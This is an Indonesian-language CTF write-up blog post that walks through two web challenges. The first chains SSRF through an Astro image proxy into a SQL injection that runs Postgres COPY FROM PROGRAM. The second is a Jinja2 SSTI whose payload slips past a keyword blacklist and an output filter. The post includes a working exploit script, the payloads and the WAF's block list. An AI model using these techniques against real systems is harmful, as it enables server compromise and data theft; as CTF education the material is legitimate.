@@ -1,0 +1,679 @@
+---
+layout: post
+title: "SNI CTF 2025 - Web"
+date: 2025-12-13
+image: /assets/.
+categories: ["SNI"]
+tags: [web, sqli, ssti, lfi, ctf2025]
+excerpt: "Sqli injection, LFI and SSTI + Bypassing WAF on jinja2"
+---
+
+
+## Photo Gallery
+
+Target: `http://178.128.116.83:4321/`
+
+### Intro
+
+Di depan mata ini cuma *photo gallery* lucu: upload gambar, liat thumbnail, selesai.
+
+Tapi justru karena “cuma gallery”, kita sering lengah sama satu hal: **gambar itu harus diambil dari mana?**  
+Dan di challenge ini, jawabannya bikin kita senyum tipis: server punya *image proxy/optimizer* yang mau nge-`fetch()` URL apa pun… lalu di belakangnya ada API internal yang *ngobrol* sama database pakai query string buatan tangan.
+
+Aku ceritain perjalanan dari recon sampai flag-nya kebuka—ringkas, tajam, tapi tetap enak diikutin.
+
+---
+
+### Recon: baca halaman, tangkap “bau” yang aneh
+
+Buka target:
+
+```bash
+curl -sS http://178.128.116.83:4321/ | head
+```
+
+Kalau kamu scroll source HTML-nya (atau buka lewat browser → View Source), bagian gallery biasanya ngasih petunjuk paling jujur. Dan di sini, thumbnail pakai URL kayak gini:
+
+```
+/_image?href=http%3A%2F%2Flocalhost%3A4321%2Fapi%2Fimages%2F<ID>&w=320&h=320&f=webp
+```
+
+Kalimatnya: **server melakukan fetch ke sebuah `href=`**, lalu mengubahnya jadi gambar (`w/h/f`).
+
+Di dunia CTF, pola ini sering berarti satu kata: **SSRF**.
+
+---
+
+### Peta sistem: dua service, satu pintu depan
+
+Dari `docker-compose.yml`:
+
+```yaml
+app:
+  ports:
+    - "4321:4321"
+```
+
+Di container `app`, ternyata ada dua proses (lihat `deploy/apps/start.sh`):
+
+```sh
+python3 /app/internal/app.py &   # Flask API (port 5000)
+node /app/external/dist/server/entry.mjs &  # Astro frontend (port 4321)
+```
+
+Frontend Astro di `:4321` jadi “pintu depan”. Flask internal jalan di `:5000` dan *harusnya* gak bisa kita akses langsung dari luar.
+
+Kalau ada SSRF, itu artinya: **Astro bisa kita paksa buat ngobrol sama Flask**.
+
+---
+
+### Bug #1 — SSRF via `/_image` (Astro image optimizer)
+
+Konfigurasinya *terlalu permisif* (`deploy/apps/external/astro.config.mjs`):
+
+```js
+image: { remotePatterns: [{ protocol: 'http' }, { protocol: 'https' }] },
+```
+
+Artinya: selama `href=` adalah `http(s)://...`, Astro akan coba fetch.
+
+Dan karena fetch-nya terjadi **di server**, target seperti ini jadi legal:
+
+- `http://localhost:5000/...` (Flask internal)
+- `http://127.0.0.1:5000/...`
+- bahkan service internal lain kalau ada
+
+Ini bukan cuma SSRF “cek port”. Ini SSRF yang benar-benar *jadi jembatan* ke backend internal.
+
+---
+
+### Bug #2 — SQL injection yang “muncul kalau param-nya dobel”
+
+Sekarang kita intip Flask API (`deploy/apps/internal/blueprints/api.py`). Ada helper kecil:
+
+```py
+def get_param(name, default=None):
+    values = request.args.getlist(name)
+    if not values:
+        return default
+    if len(values) == 1:
+        return values[0]
+    return values
+```
+
+Kalau kita kirim `?title=x`, `title` itu string.  
+Tapi kalau kita kirim `?title=x&title=y`, `title` berubah jadi **list**.
+
+Lalu `title` dipakai di query ini:
+
+```py
+rows = conn.run(
+  f"SELECT ... FROM images "
+  f"WHERE title={literal(title)} OR {literal(title)} IS NULL "
+  f"ORDER BY id DESC LIMIT {literal(limit)} OFFSET {literal((page - 1) * limit)}",
+)
+```
+
+Sekilas kelihatan aman karena pakai `pg8000.native.literal(...)`. Masalahnya: `literal()` punya implementasi khusus untuk `list`.
+
+Kalau `title` adalah list, `literal(list)` membentuk string array Postgres tanpa escaping karakter `'` di tiap elemennya. Jadi payload seperti:
+
+```
+title=x'; <SQL-KITA>; --
+title=y
+```
+
+akan menghasilkan potongan query yang “pecah” seperti ini (konsepnya):
+
+```
+WHERE title='{x'; <SQL-KITA>; -- ,y}' OR ...
+```
+
+Single-quote dari payload nutup string lebih awal → sisanya jadi SQL bebas → **stacked query** jalan.
+
+Inilah momen “klik” paling satisfying: bug-nya bukan di `title` biasa, tapi di **title yang dikirim dobel**.
+
+---
+
+### Kenapa ini jadi flag? Karena DB container punya `/readflag` SUID
+
+Di `deploy/db/Dockerfile`:
+
+```dockerfile
+COPY flag /flag
+RUN chmod 400 /flag
+RUN gcc /readflag.c -o /readflag
+RUN chmod 4755 /readflag
+```
+
+`/flag` cuma bisa dibaca root. Tapi ada binary `/readflag` yang SUID root, dan tugasnya cuma:
+
+```c
+fopen("/flag","r"); fgets(...); printf("%s\n", s);
+```
+
+Kalau kita bisa bikin Postgres menjalankan `/readflag`, kita dapat isi flag.
+
+Postgres punya fitur “nakal tapi resmi”: `COPY ... FROM PROGRAM 'cmd'`.
+
+Jadi targetnya jelas:
+
+1) SQLi → jalankan `COPY ... FROM PROGRAM '/readflag'`  
+2) simpan outputnya ke tempat yang bisa kita baca dari web (misalnya `images.title`)  
+3) ambil lagi lewat endpoint publik `/api/images`
+
+---
+
+### Exploit: SSRF ➜ SQLi ➜ COPY FROM PROGRAM ➜ flag muncul di title
+
+#### 1) Payload SQL (stacked query)
+
+Strateginya:
+
+- bikin table `leak(flag text)`
+- `COPY leak FROM PROGRAM '/readflag'`
+- `UPDATE images SET title=(SELECT flag FROM leak LIMIT 1) WHERE id=(SELECT MAX(id) FROM images)`
+
+Aku pakai `/**/` sebagai pengganti spasi biar lebih “URL-friendly”.
+
+#### 2) Bungkus pakai SSRF `/_image?href=...`
+
+Karena yang bisa kita akses dari luar cuma `:4321`, kita “nitip request” lewat Astro image optimizer:
+
+```bash
+URL="$(python3 - <<'PY'
+import urllib.parse
+HOST = "178.128.116.83:4321"
+payload = (
+  "x';BEGIN;"
+  "DROP/**/TABLE/**/IF/**/EXISTS/**/leak;"
+  "CREATE/**/TABLE/**/leak(flag/**/text);"
+  "COPY/**/leak/**/FROM/**/PROGRAM/**/'/readflag';"
+  "UPDATE/**/images/**/SET/**/title=("
+    "SELECT/**/flag/**/FROM/**/leak/**/LIMIT/**/1"
+  ")/**/WHERE/**/id=("
+    "SELECT/**/MAX(id)/**/FROM/**/images"
+  ");"
+  "COMMIT;--"
+)
+inner = (
+  "http://localhost:5000/api/images?"
+  "title=" + urllib.parse.quote(payload, safe="") +
+  "&title=y"
+)
+print(
+  f"http://{HOST}/_image?"
+  "href=" + urllib.parse.quote(inner, safe="") +
+  "&w=1&h=1&f=png"
+)
+PY
+)"
+
+curl -sS "$URL" -o /dev/null -w "%{http_code}\n"
+```
+
+Catatan: output `500` itu normal; yang penting side-effect SQL-nya jalan.
+
+#### 3) Ambil flag dari endpoint publik
+
+Setelah SQL berhasil, flag akan nongol sebagai `title` di item terbaru:
+
+```bash
+curl -sS http://178.128.116.83:4321/api/images | rg 'SNI\\{'
+```
+
+Dan kita dapat flag nya.
+
+### Flag
+
+`SNI{s1mpL3_$$RF_$Qli_R1ght?}`
+
+---
+
+## SNI Basecamp
+
+Target: `http://178.128.116.83:33339/`
+
+### Intro
+
+Challenge **SNI Basecamp** ini sekilas kelihatan “template landing page” biasa: navbar Bootstrap, status role di pojok, dan beberapa menu seperti **Preview**, **Render**, **Multiplier**, dan **Media**. Tampilan home juga polos:
+
+```bash
+$ curl -i http://178.128.116.83:33339/
+...
+STATUS: USER
+```
+
+Tidak ada form login, tidak ada tombol “promote to admin”. Tapi ada satu rute yang sangat menggoda:
+
+- `/admin` → selalu bilang “Access denied.” ketika role kita masih USER
+- `/flag` → cuma bisa diakses kalau `session["is_admin"] == True`
+
+Jadi misi kita jelas: **gimana cara meng-upgrade diri dari USER jadi ADMIN, atau minimal baca flag tanpa lewat jalan resmi**.
+
+Sisi menariknya: back-end-nya Flask, templating-nya Jinja2, dan ada WAF kecil-kecilan yang berusaha menahan kita. Di write-up ini aku ceritakan perjalanan dari recon, baca source, sampai nemu chain SSTI + bypass WAF + bypass outbound-filter yang akhirnya ngobrol langsung dengan `FLAG`.
+
+---
+
+### Recon: keliling halaman & fitur
+
+Pertama, jalan-jalan dulu ke semua endpoint publik:
+
+```bash
+$ curl -i http://178.128.116.83:33339/
+$ curl -i http://178.128.116.83:33339/admin
+$ curl -i http://178.128.116.83:33339/preview
+$ curl -i http://178.128.116.83:33339/render
+$ curl -i http://178.128.116.83:33339/multiplier
+$ curl -i http://178.128.116.83:33339/media
+```
+
+Observasi singkat:
+
+- `/admin` selalu menampilkan “Restricted – Access denied.”, tapi **HTTP status-nya 200** (bukan redirect, bukan 403).
+- `/preview` menyediakan form “Expression” dan mengeksekusi ekspresi itu di server lalu menampilkan outputnya di dalam “terminal”.
+- `/render` mirip, tapi membiarkan kita memilih **body expression** dan **layout**.
+- `/multiplier` minta dua ekspresi: satu untuk **header key**, satu untuk **header value**. Outputnya dikirim ke header HTTP dan cookie `trace`.
+- `/media` cuma embed video YouTube (ini jebakan biar kita terdistraksi).
+
+Jadi ada tiga kandidat kuat untuk bug web:
+
+1. `/preview` (eksekusi ekspresi Jinja)
+2. `/render` (lebih bebas, bisa pilih layout)
+3. `/multiplier` (eksekusi ekspresi lalu output ke header/cookie)
+
+Selebihnya, kita butuh lihat source buat ngerti apakah ini sekadar kalkulator atau sudah masuk ranah **SSTI full-power**.
+
+---
+
+### Baca Source: memahami “sandbox” ala penulis chall
+
+Di environment, cuma ada satu file:
+
+```bash
+$ ls
+app.py
+```
+
+Inti aplikasinya ada di `app.py`, dan highlight pentingnya seperti ini (diringkas):
+
+```py
+app = Flask(__name__)
+app.secret_key = SECRET
+
+with open("flag.txt", "r") as f:
+    FLAG = f.read().strip()
+
+def helper():
+    return 1
+
+def xs(seq, start=0, end=None):
+    return seq[start:end]
+
+def xr(s, a, b):
+    return str(s).replace(a, b)
+
+app.jinja_env.globals["h"] = helper
+app.jinja_env.filters["xs"] = xs
+app.jinja_env.filters["xr"] = xr
+```
+
+Beberapa hal menarik langsung muncul:
+
+- `FLAG` dibaca sekali di global, bukan dari file di tiap request.
+- Ada helper `h` yang diekspos ke Jinja sebagai global.
+- Ada dua filter custom `xs` dan `xr` yang bisa membantu manipulasi string.
+
+Lalu ada WAF versi inbound yang cukup agresif:
+
+```py
+BLACK_LIST = [
+    "application", "request", "wsgi", "environ", "getitem", "}}", "{{", "import", "from",
+    "builtin", "builtins", "os", "system", "popen", "subprocess", "eval", "exec", "code",
+    "read", "open", "file", "path", "root", "home", "bin", "bash", "sh", "cat", "flag", "secret",
+    "session", "cookie", "config", "globals", "mro", "subclass", "subclasses", "class", "type",
+    "base", "inspect", "sys", "site", "loader", "importlib", "compile", "lambda", "locals", "vars",
+    "dir", "repr", "format", "python", "jinja", "safe", "range", "join", "joiner", "cycler",
+    "namespace", "update", "pop", "clear", "items", "values", "walk", "glob", "json", "pickle",
+    "marshal", "yaml", "hash", "hashlib", "get", "attribute", "groupby",
+]
+
+def is_blocked(value):
+    if not value:
+        return False
+    try:
+        lowered = unicodedata.normalize("NFKC", str(value)).lower()
+    except Exception:
+        lowered = str(value).lower()
+    return any(x in lowered for x in BLACK_LIST)
+
+@app.before_request
+def inbound_waf():
+    parts = [request.path, request.query_string.decode("latin-1", "ignore"), body, ...]
+    ...
+    for part in parts:
+        if part and is_blocked(part):
+            return Response("blocked", status=400, mimetype="text/plain")
+```
+
+Jadi:
+
+- **Semua** request (path, query, body) akan di-scan untuk substring blacklist (case-insensitive, setelah normalisasi Unicode).
+- Kalau ada satu saja yang match → langsung `blocked`.
+
+Sebagai penutup, ada outbound WAF yang lebih sadis:
+
+```py
+BLOCKED_PREFIX = "SNI{"
+
+@app.after_request
+def outbound_waf(response):
+    ...
+    combined = "\n".join(parts)
+    if FLAG in combined or BLOCKED_PREFIX.lower() in combined.lower():
+        return Response("denied", mimetype="text/plain")
+    return response
+```
+
+Artinya:
+
+- Walaupun kita berhasil mengeksekusi SSTI dan menyentuh `FLAG`, selama string `FLAG` atau substring `"SNI{"` muncul di **body atau header** response, output final akan diubah jadi `"denied"`.
+- Jadi permainan kita bukan sekadar “baca flag”, tapi **baca flag tanpa pernah mengeluarkan `SNI{` ke wire**.
+
+---
+
+### Bug utama: SSTI di `/preview`, `/render`, dan `/multiplier`
+
+Sekarang lihat handler yang mencurigakan.
+
+#### `/preview`
+
+```py
+@app.route("/preview")
+def preview():
+    expr = request.args.get("tpl", "")
+    if not expr:
+        return render_template("preview.html", result="", expr="")
+    if is_blocked(expr):
+        return render_template("preview.html", result="blocked", expr=expr)
+    try:
+        out = render_template_string("{{" + expr + "}}")
+    except Exception:
+        out = "error"
+    return render_template("preview.html", result=out, expr=expr)
+```
+
+`expr` langsung dilempar ke Jinja sebagai expression di dalam `{{ ... }}`. Ini **Server-Side Template Injection** klasik, tapi dipagari oleh:
+
+- blacklist WAF (`is_blocked(expr)`)
+- outbound filter (nggak boleh ada `FLAG`/`SNI{` di response)
+
+Uji coba sederhana:
+
+```bash
+$ curl "http://178.128.116.83:33339/preview?tpl=1+2"
+...
+output
+3
+```
+
+Artinya: kita bisa eksekusi expression Jinja sepuasnya, selama string-nya lolos blacklist.
+
+### `/render`
+
+```py
+@app.route("/render")
+def render_view():
+    raw = request.query_string.decode("latin-1", "ignore")
+
+    tpl = ""
+    layout = "base.html"
+
+    for part in raw.split("&"):
+        if part.startswith("tpl="):
+            tpl = part[4:]
+        elif part.startswith("layout="):
+            layout = part[7:] or "base.html"
+
+    ...
+    if is_blocked(tpl) or is_blocked(layout):
+        return render_template("render.html", expr=tpl, layout=layout, result="blocked")
+
+    try:
+        t = (
+            "{% extends '"
+            + layout
+            + "' %}{% block content %}{{"
+            + tpl
+            + "}}{% endblock %}"
+        )
+        out = render_template_string(t, is_admin=session.get("is_admin"))
+    except Exception:
+        out = "error"
+```
+
+`tpl` di sini juga expression Jinja, persis seperti di `/preview`, hanya saja dibungkus dengan `{% extends ... %}`. Menarik, tapi untuk eksploitasi akhir aku tidak perlu pakai route ini—lebih simple lewat `/preview`.
+
+#### `/multiplier`
+
+```py
+@app.route("/multiplier")
+def multiplier():
+    k = request.args.get("k", "")
+    v = request.args.get("v", "")
+    ...
+    if is_blocked(k) or is_blocked(v):
+        ...
+
+    try:
+        rk_raw = render_template_string("{{" + k + "}}")
+        rv = render_template_string("{{" + v + "}}")
+    except Exception:
+        ...
+
+    header_name = "".join(ch for ch in rk_raw if 33 <= ord(ch) <= 126) or "X-Trace"
+    header_name = header_name[:64]
+    header_value = str(rv)[:128]
+
+    resp.headers[header_name] = header_value
+    resp.set_cookie("trace", header_value, httponly=False, samesite="Lax")
+```
+
+Di sini juga ada SSTI ganda: `k` untuk nama header, `v` untuk nilai. hasil `rv` kita dipasang ke header *dan* cookie. Lagi-lagi, semua tetap diawasi outbound WAF (kalau ada `"SNI{"` di header, juga bakal kena).
+
+**Kesimpulan:** kita punya beberapa SSTI engine, tapi semua:
+
+- disaring inputnya oleh blacklist `is_blocked`
+- disensor output-nya oleh outbound WAF (`FLAG` / `SNI{` → `denied`)
+
+Tantangan yang sebenarnya: **bukan sekadar bikin SSTI, tapi bypass dua lapis proteksi sekaligus**.
+
+---
+
+### Menyentuh `FLAG` lewat Jinja: bypass blacklist
+
+Langkah berikutnya: cari cara menyentuh `FLAG` dari dalam sandbox Jinja.
+
+Di Python, variabel global modul bisa diakses dari Jinja kalau kita bisa mendapatkan objek modulnya, atau memanfaatkan global bawaan. Di sini ada clue: helper `h` diinject sebagai global:
+
+```py
+app.jinja_env.globals["h"] = helper
+```
+
+Dalam konteks Jinja, `h` adalah objek function Python. Biasanya, dari function, kita bisa menelusuri ke `__globals__` yang berisi semua variabel global modul, termasuk `FLAG`. Di Jinja, attribute bisa diakses dengan filter `attr`.
+
+Secara teori, ekspresinya:
+
+```jinja2
+(h|attr("__globals__"))["FLAG"]
+```
+
+Masalahnya: kata `globals` dan `flag` keduanya ada di blacklist:
+
+- `"globals"` → ada di `BLACK_LIST`
+- `"flag"` → juga diblok
+
+Kita butuh cara membentuk string `"__globals__"` dan `"FLAG"` **tanpa menuliskannya literal**.
+
+Untungnya, Jinja punya operator concatenation `~`. Jadi `"__glo" ~ "bals__"` tidak mengandung substring `"globals"` di level source, tapi di runtime jadi `"__globals__"`. Hal yang sama bisa kita lakukan untuk `"FLAG"`:
+
+```jinja2
+('__glo' ~ 'bals__')   → "__globals__"
+'F' ~ 'L' ~ 'A' ~ 'G'  → "FLAG"
+```
+
+Maka payload SSTI yang lebih stealth:
+
+```jinja2
+(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']
+```
+
+Sebelum dites ke server, aku cek dulu apakah string ini bakal ketemu blacklist secara lokal (biar nggak bolak-balik “blocked”):
+
+```py
+BLACK_LIST = [...]
+def is_blocked(value):
+    import unicodedata
+    if not value:
+        return False
+    try:
+        lowered = unicodedata.normalize("NFKC", str(value)).lower()
+    except Exception:
+        lowered = str(value).lower()
+    return any(x in lowered for x in BLACK_LIST)
+
+expr = "(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']"
+print(is_blocked(expr))          # False
+```
+
+Hasilnya `False`, artinya **payload ini aman dari inbound WAF**.
+
+Sekarang coba jalankan di Jinja lokal dengan FLAG dummy:
+
+```py
+from jinja2 import Environment
+
+env = Environment()
+FLAG = "SNI{test_flag}"
+
+def helper():
+    return 1
+
+expr = "(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']"
+tpl = env.from_string("{{ " + expr + " }}")
+print(tpl.render(h=helper, FLAG=FLAG))
+```
+
+Output:
+
+```text
+SNI{test_flag}
+```
+
+Jadi secara teori, di server pun akan seperti itu. Hanya saja, kalau kita langsung kirim:
+
+```bash
+GET /preview?tpl=(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']
+```
+
+meski inbound WAF mengizinkan, outbound WAF akan panik karena response body berisi `"SNI{"` → hasil akhir cuma `"denied"`.
+
+Kita butuh cara mengeluarkan info `FLAG` **tanpa memicu substring `"SNI{"`**.
+
+---
+
+### Bypass outbound WAF: balik string FLAG
+
+Trik klasik untuk melewati filter substring adalah memanipulasi output di sisi server, sehingga value yang dikirim ke klien tidak lagi mengandung pattern yang dicari, tapi masih cukup untuk kita kembalikan ke bentuk asli di sisi kita.
+
+Outbound WAF hanya peduli pada:
+
+- `if FLAG in combined`
+- `or "sni{" in combined.lower()`
+
+Dia tidak mengecek kebalikannya, tidak mengecek hex-nya, tidak mengecek base64-nya. Itu berarti kita bisa:
+
+1. Menghasilkan FLAG, lalu di-**reverse** sebelum dikirim.
+2. Di sisi klien, reverse lagi untuk mengembalikannya.
+
+Dalam Jinja, reverse string bisa dilakukan dengan slicing `[::-1]`. Jadi ekspresi yang tadinya:
+
+```jinja2
+(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']
+```
+
+kita modifikasi jadi:
+
+```jinja2
+(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G'][::-1]
+```
+
+Aku cek dulu lokal:
+
+```py
+from jinja2 import Environment
+
+env = Environment()
+FLAG = "SNI{test_flag}"
+
+def helper():
+    return 1
+
+expr = "(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G'][::-1]"
+tpl = env.from_string("{{ " + expr + " }}")
+print(tpl.render(h=helper, FLAG=FLAG))
+```
+
+Output:
+
+```text
+}galf_tset{INS
+```
+
+Tidak ada `"SNI{"` di string ini, jadi outbound WAF seharusnya senang-senang saja. Tinggal kirim ke server.
+
+Di sisi HTTP, aku pakai `curl` tanpa encode aneh-aneh, hanya mematikan globbing:
+
+```bash
+$ curl --globoff \
+  "http://178.128.116.83:33339/preview?tpl=(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G'][::-1]"
+```
+
+Output HTML-nya (dipotong ke bagian penting):
+
+```html
+<div class="terminal mt-4">
+  <div><span class="prompt">preview</span>:<span class="path">/run</span>$ output</div>
+  <div>}sss4pyb_3lpmis_4_tsuj_aw1jd_p4tn4um{INS</div>
+</div>
+```
+
+String di terminal:
+
+```text
+}sss4pyb_3lpmis_4_tsuj_aw1jd_p4tn4um{INS
+```
+
+Kalau kita balik lagi di lokal:
+
+```bash
+$ python - << 'PY'
+s = "}sss4pyb_3lpmis_4_tsuj_aw1jd_p4tn4um{INS"
+print(s[::-1])
+PY
+```
+
+Hasil:
+
+```text
+SNI{mu4nt4p_dj1wa_just_4_simpl3_byp4sss}
+```
+
+Outbound WAF tidak protes, karena yang keluar ke wire tidak pernah mengandung substring `"SNI{"`, tapi kita tetap berhasil mengembalikan flag di sisi kita.
+
+
+### Flag
+
+`SNI{mu4nt4p_dj1wa_just_4_simpl3_byp4sss}`
+
+---
